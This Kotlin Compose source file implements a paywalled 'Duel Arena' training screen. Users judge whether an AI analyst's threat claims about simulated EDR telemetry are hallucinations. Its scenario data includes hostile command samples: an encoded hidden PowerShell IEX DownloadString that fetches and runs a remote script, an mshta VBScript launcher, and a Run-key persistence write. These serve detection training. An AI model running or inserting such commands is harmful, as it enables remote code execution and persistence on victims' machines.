package com.example.ui.screens

import androidx.compose.animation.*
import androidx.compose.animation.core.*
import androidx.compose.foundation.BorderStroke
import androidx.compose.foundation.background
import androidx.compose.foundation.border
import androidx.compose.foundation.clickable
import androidx.compose.foundation.layout.*
import androidx.compose.foundation.rememberScrollState
import androidx.compose.foundation.shape.RoundedCornerShape
import androidx.compose.foundation.verticalScroll
import androidx.compose.material.icons.Icons
import androidx.compose.material.icons.automirrored.filled.ArrowBack
import androidx.compose.material.icons.filled.*
import androidx.compose.material3.*
import androidx.compose.runtime.*
import androidx.compose.ui.Alignment
import androidx.compose.ui.Modifier
import androidx.compose.ui.graphics.Color
import androidx.compose.ui.graphics.graphicsLayer
import androidx.compose.ui.platform.testTag
import androidx.compose.ui.text.font.FontFamily
import androidx.compose.ui.text.font.FontWeight
import androidx.compose.ui.unit.dp
import androidx.compose.ui.unit.sp
import com.example.data.AegoraRepository
import com.example.subscription.AegoraSubscriptionRepository

/**
 * 1. The Async Adversary Duel Arena
 * This screen forces the user to analyze raw telemetry and decide if the AI is hallucinating,
 * maintaining absolute visual focus on the terminal and the claim.
 * Connected to RevenueCat logic to enforce the paywall after free tier duels.
 */
@Composable
fun DuelArenaScreen(
  onNavigateBack: () -> Unit,
  onShowPaywall: () -> Unit,
  modifier: Modifier = Modifier
) {
  val obsidianBg = Color(0xFF090A0C)
  val matteSteel = Color(0xFF15171C)
  val slateBorder = Color(0xFF2D313A)
  val cobaltBlue = Color(0xFF2962FF)

  val subscriptionState by AegoraSubscriptionRepository.subscriptionState.collectAsState()
  val duelsEngaged by AegoraSubscriptionRepository.adversaryDuelsEngaged.collectAsState()

  val isPro = AegoraSubscriptionRepository.canAccessAdversaryDuel() ||
    subscriptionState.entitlementIdentifiers.contains(AegoraSubscriptionRepository.ENTITLEMENT_PRO)

  var activeSeedIndex by remember { mutableIntStateOf(0) }
  var hasDecodedPayload by remember { mutableStateOf(false) }
  var duelOutcome by remember { mutableStateOf<String?>(null) }
  var isCorrectDecision by remember { mutableStateOf<Boolean?>(null) }

  val duelSeeds = listOf(
    DuelScenario(
      id = "SEED_LAZARUS",
      adversary = "Hidden Cobra (Lazarus)",
      rawTelemetry = "> 14:18:44 Sysmon EDR [Event ID 3 - Network Connection]\n" +
        "> Image: C:\\Windows\\System32\\svchost.exe (PID 912)\n" +
        "> Protocol: tcp, Initiated: true\n" +
        "> SourceIp: 10.0.4.18, SourcePort: 49822\n" +
        "> DestinationIp: 20.190.159.23, DestinationPort: 443\n" +
        "> DestinationHostname: login.microsoftonline.com\n" +
        "> User: NT AUTHORITY\\SYSTEM",
      decodedPayload = "DECODED TELEMETRY INSPECTION:\nStandard Azure Active Directory token refresh handshake. TLS 1.3 certificate signed by Microsoft RSA TLS CA 02.",
      aiClaim = "High: Outbound beaconing to Lazarus C2 domain masquerading as Microsoft Graph.",
      isAiHallucinating = true,
      explanation = "AI Hallucination Caught! Destination IP resolves to legitimate Microsoft Entra ID authentication cluster. The AI misclassified standard OAuth renewal as an APT beacon."
    ),
    DuelScenario(
      id = "SEED_APT29",
      adversary = "Cozy Bear (APT29)",
      rawTelemetry = "> 09:34:02 Sysmon EDR [Event ID 1]\n" +
        "> ProcessGuid: {8f3e-4412-98ab-001}\n" +
        "> Image: C:\\Program Files\\Microsoft Office\\root\\Office16\\WINWORD.EXE (PID 4412)\n" +
        "> CommandLine: WINWORD.EXE /n \"C:\\Users\\victim\\Documents\\Invoice_982.docm\"\n" +
        "> ParentProcessGuid: {1a2b-3c4d-5e6f-7890}\n" +
        "> TargetFilename: C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe (PID 6108)\n" +
        "> ProcessCommandLine: powershell.exe -NoP -NonI -W Hidden -Exec Bypass -EncodedCommand SQBFAFgA...",
      decodedPayload = "DECODED (-EncodedCommand):\nIEX (New-Object System.Net.WebClient).DownloadString('https://telemetry-cdn.internal-azure.net/beacon.ps1'); # Cobalt Strike Stager V4.9 - Port 443 HTTPS",
      aiClaim = "Critical: Cobalt Strike beaconing detected via encoded PowerShell execution.",
      isAiHallucinating = false,
      explanation = "Accurate Detection! WINWORD.EXE spawning an encoded hidden PowerShell process contacting an unverified CDN endpoint matches MITRE T1059.001 & T1071.001."
    ),
    DuelScenario(
      id = "SEED_FIN7",
      adversary = "Carbanak / FIN7",
      rawTelemetry = "> 22:04:11 EDR FileCreate [Event ID 11]\n" +
        "> Image: mshta.exe (PID 3304)\n" +
        "> TargetFilename: C:\\ProgramData\\Windows\\perflogs\\cache.vbs\n" +
        "> CommandLine: mshta.exe vbscript:Close(Execute(\"CreateObject(\"\"WScript.Shell\"\").Run \"\"powershell -ep bypass -f cache.vbs\"\",0\"))",
      decodedPayload = "DECODED SCRIPT:\nDim obj: Set obj = WScript.CreateObject(\"WScript.Shell\"): obj.RegWrite \"HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run\\TelemetrySync\", \"cache.vbs\"",
      aiClaim = "Critical: Living-Off-The-Land (LOLBin) mshta persistence via Run key registry injection.",
      isAiHallucinating = false,
      explanation = "Correct! The AI correctly identified mshta.exe executing inline VBScript to drop persistent registry execution in HKCU Run key."
    )
  )

  val currentScenario = duelSeeds[activeSeedIndex % duelSeeds.size]

  fun handleDuelDecision(userAcceptedClaim: Boolean) {
    // RevenueCat Gate Check
    if (!AegoraSubscriptionRepository.canAccessAdversaryDuel()) {
      onShowPaywall()
      return
    }

    // Record usage
    AegoraSubscriptionRepository.recordDuelEngaged()

    val correct = if (userAcceptedClaim) {
      !currentScenario.isAiHallucinating
    } else {
      currentScenario.isAiHallucinating
    }

    isCorrectDecision = correct
    if (correct) {
      AegoraRepository.awardExperience(120)
      duelOutcome = if (userAcceptedClaim) {
        "EXACT MATCH (+120 XP): You verified the AI analyst claim! ${currentScenario.explanation}"
      } else {
        "[AI FAILURE DETECTED ✓] HALLUCINATION BUSTED (+120 XP): Outstanding telemetry analysis! ${currentScenario.explanation}"
      }
    } else {
      duelOutcome = if (userAcceptedClaim) {
        "MISIDENTIFICATION: The AI hallucinated this threat. ${currentScenario.explanation}"
      } else {
        "MISSED THREAT: The AI claim was accurate. Raw telemetry confirmed an active adversary technique."
      }
    }
  }

  Column(
    modifier = modifier
      .fillMaxSize()
      .background(obsidianBg)
      .padding(16.dp),
    verticalArrangement = Arrangement.spacedBy(16.dp)
  ) {
    // Top Navigation & Header Row
    Row(
      modifier = Modifier.fillMaxWidth(),
      verticalAlignment = Alignment.CenterVertically,
      horizontalArrangement = Arrangement.SpaceBetween
    ) {
      Row(verticalAlignment = Alignment.CenterVertically) {
        IconButton(
          onClick = onNavigateBack,
          modifier = Modifier.size(36.dp).testTag("duel_arena_back_button")
        ) {
          Icon(Icons.AutoMirrored.Filled.ArrowBack, contentDescription = "Back", tint = Color.White)
        }
        Spacer(modifier = Modifier.width(8.dp))
        Text(
          "ACTIVE DUEL: ${currentScenario.id}",
          color = Color.White,
          fontSize = 14.sp,
          fontWeight = FontWeight.Bold,
          fontFamily = FontFamily.Monospace
        )
      }

      // RevenueCat Entitlement & Quota Pill
      Surface(
        onClick = onShowPaywall,
        shape = RoundedCornerShape(12.dp),
        color = if (isPro) Color(0x222962FF) else Color(0x2200E676),
        border = BorderStroke(1.dp, if (isPro) cobaltBlue else Color(0x4400E676)),
        modifier = Modifier.testTag("duel_paywall_pill")
      ) {
        Row(
          modifier = Modifier.padding(horizontal = 8.dp, vertical = 4.dp),
          verticalAlignment = Alignment.CenterVertically,
          horizontalArrangement = Arrangement.spacedBy(4.dp)
        ) {
          Icon(
            if (isPro) Icons.Default.WorkspacePremium else Icons.Default.Bolt,
            contentDescription = null,
            tint = if (isPro) cobaltBlue else Color(0xFF00E676),
            modifier = Modifier.size(14.dp)
          )
          Text(
            text = if (subscriptionState.tier != com.example.model.SubscriptionTier.FREE) "PRO • UNLIMITED" else "${2 - duelsEngaged}/2 DUELS LEFT",
            fontSize = 10.sp,
            fontWeight = FontWeight.Bold,
            color = Color.White
          )
        }
      }
    }

    // Adversary Selector Strip
    Row(
      modifier = Modifier.fillMaxWidth(),
      horizontalArrangement = Arrangement.spacedBy(8.dp)
    ) {
      duelSeeds.forEachIndexed { index, scenario ->
        val selected = index == activeSeedIndex
        Surface(
          shape = RoundedCornerShape(6.dp),
          color = if (selected) cobaltBlue.copy(alpha = 0.25f) else matteSteel,
          border = BorderStroke(1.dp, if (selected) cobaltBlue else slateBorder),
          modifier = Modifier
            .weight(1f)
            .clickable {
              activeSeedIndex = index
              duelOutcome = null
              hasDecodedPayload = false
            }
        ) {
          Text(
            text = scenario.id.removePrefix("SEED_"),
            color = if (selected) Color.White else Color(0xFF8A919E),
            fontSize = 10.sp,
            fontWeight = FontWeight.Bold,
            fontFamily = FontFamily.Monospace,
            modifier = Modifier.padding(vertical = 6.dp),
            textAlign = androidx.compose.ui.text.style.TextAlign.Center
          )
        }
      }
    }

    // Raw SIEM Telemetry Terminal
    Box(
      modifier = Modifier
        .fillMaxWidth()
        .weight(1f)
        .background(Color.Black, RoundedCornerShape(8.dp))
        .border(1.dp, slateBorder, RoundedCornerShape(8.dp))
        .padding(16.dp)
        .testTag("raw_siem_terminal")
    ) {
      Column(
        modifier = Modifier
          .fillMaxSize()
          .verticalScroll(rememberScrollState()),
        verticalArrangement = Arrangement.spacedBy(10.dp)
      ) {
        Row(
          modifier = Modifier.fillMaxWidth(),
          horizontalArrangement = Arrangement.SpaceBetween,
          verticalAlignment = Alignment.CenterVertically
        ) {
          Text(
            text = "SIEM // EDR TELEMETRY STREAM",
            color = Color(0xFF8A919E),
            fontSize = 10.sp,
            fontFamily = FontFamily.Monospace
          )
          Text(
            text = if (hasDecodedPayload) "[ HIDE DECODED ]" else "[ DECODE BASE64 ]",
            color = Color(0xFF00E676),
            fontSize = 10.sp,
            fontWeight = FontWeight.Bold,
            fontFamily = FontFamily.Monospace,
            modifier = Modifier.clickable { hasDecodedPayload = !hasDecodedPayload }
          )
        }

        Text(
          text = currentScenario.rawTelemetry,
          color = Color(0xFF00E676),
          fontFamily = FontFamily.Monospace,
          fontSize = 12.sp,
          lineHeight = 18.sp
        )

        AnimatedVisibility(visible = hasDecodedPayload) {
          Surface(
            shape = RoundedCornerShape(4.dp),
            color = Color(0x2200E676),
            border = BorderStroke(0.8.dp, Color(0x5500E676)),
            modifier = Modifier.fillMaxWidth().padding(top = 8.dp)
          ) {
            Text(
              text = currentScenario.decodedPayload,
              color = Color(0xFFB9F6CA),
              fontFamily = FontFamily.Monospace,
              fontSize = 11.sp,
              lineHeight = 16.sp,
              modifier = Modifier.padding(10.dp)
            )
          }
        }
      }
    }

    // AI Analyst Claim Card
    Card(
      colors = CardDefaults.cardColors(containerColor = matteSteel),
      shape = RoundedCornerShape(8.dp),
      border = BorderStroke(1.dp, slateBorder),
      modifier = Modifier
        .wrapContentHeight()
        .testTag("ai_analyst_claim_card")
    ) {
      Column(
        modifier = Modifier.padding(16.dp),
        verticalArrangement = Arrangement.spacedBy(8.dp)
      ) {
        Row(
          modifier = Modifier.fillMaxWidth(),
          horizontalArrangement = Arrangement.SpaceBetween,
          verticalAlignment = Alignment.CenterVertically
        ) {
          Text("AI ANALYST CLAIM", color = Color(0xFF8A919E), fontSize = 10.sp, fontWeight = FontWeight.Bold)
          Text("CONFIDENCE: 94.2%", color = Color(0xFF2962FF), fontSize = 10.sp, fontFamily = FontFamily.Monospace)
        }
        Text(
          currentScenario.aiClaim,
          color = Color.White,
          fontSize = 14.sp,
          lineHeight = 20.sp,
          fontWeight = FontWeight.Medium
        )
      }
    }

    // Duel Outcome Card if answered
    if (duelOutcome != null) {
      val isAiFailureDetected = duelOutcome?.contains("AI FAILURE DETECTED") == true
      val badgeAlpha by animateFloatAsState(
        targetValue = if (isAiFailureDetected) 1f else 0f,
        animationSpec = tween(durationMillis = 350, easing = FastOutSlowInEasing),
        label = "ai_failure_badge_alpha"
      )
      val badgeScale by animateFloatAsState(
        targetValue = if (isAiFailureDetected) 1f else 0.88f,
        animationSpec = spring(dampingRatio = Spring.DampingRatioMediumBouncy, stiffness = Spring.StiffnessMedium),
        label = "ai_failure_badge_scale"
      )

      Card(
        colors = CardDefaults.cardColors(
          containerColor = if (isCorrectDecision == true) Color(0x2200E676) else Color(0x22FF1744)
        ),
        shape = RoundedCornerShape(8.dp),
        border = BorderStroke(1.dp, if (isCorrectDecision == true) Color(0xFF00E676) else Color(0xFFFF1744)),
        modifier = Modifier.fillMaxWidth().testTag("duel_outcome_card")
      ) {
        Column(modifier = Modifier.padding(12.dp)) {
          if (isAiFailureDetected || (isCorrectDecision == true && !currentScenario.isAiHallucinating.not())) {
            Surface(
              color = Color(0x3300E676),
              shape = RoundedCornerShape(4.dp),
              border = BorderStroke(1.dp, Color(0xFF00E676)),
              modifier = Modifier
                .padding(bottom = 6.dp)
                .graphicsLayer(
                  alpha = badgeAlpha,
                  scaleX = badgeScale,
                  scaleY = badgeScale
                )
                .testTag("ai_failure_detected_badge")
            ) {
              Text(
                text = "[AI FAILURE DETECTED ✓]",
                color = Color(0xFF00E676),
                fontSize = 11.sp,
                fontWeight = FontWeight.Bold,
                fontFamily = FontFamily.Monospace,
                modifier = Modifier.padding(horizontal = 6.dp, vertical = 2.dp)
              )
            }
          }
          Text(
            text = duelOutcome.orEmpty(),
            color = Color.White,
            fontSize = 12.sp,
            lineHeight = 17.sp
          )
        }
      }
    }

    // Action Row
    Row(
      modifier = Modifier.fillMaxWidth(),
      horizontalArrangement = Arrangement.spacedBy(12.dp)
    ) {
      Button(
        onClick = { handleDuelDecision(userAcceptedClaim = true) },
        modifier = Modifier
          .weight(1f)
          .height(50.dp)
          .testTag("duel_accept_claim_button"),
        colors = ButtonDefaults.buttonColors(containerColor = matteSteel),
        shape = RoundedCornerShape(8.dp),
        border = BorderStroke(1.dp, slateBorder)
      ) {
        Text("ACCEPT CLAIM", color = Color.White, fontWeight = FontWeight.Bold)
      }

      Button(
        onClick = { handleDuelDecision(userAcceptedClaim = false) },
        modifier = Modifier
          .weight(1f)
          .height(50.dp)
          .testTag("duel_challenge_ai_button"),
        colors = ButtonDefaults.buttonColors(containerColor = cobaltBlue),
        shape = RoundedCornerShape(8.dp)
      ) {
        Text("CHALLENGE AI", color = Color.White, fontWeight = FontWeight.Bold)
      }
    }
  }
}

private data class DuelScenario(
  val id: String,
  val adversary: String,
  val rawTelemetry: String,
  val decodedPayload: String,
  val aiClaim: String,
  val isAiHallucinating: Boolean,
  val explanation: String
)
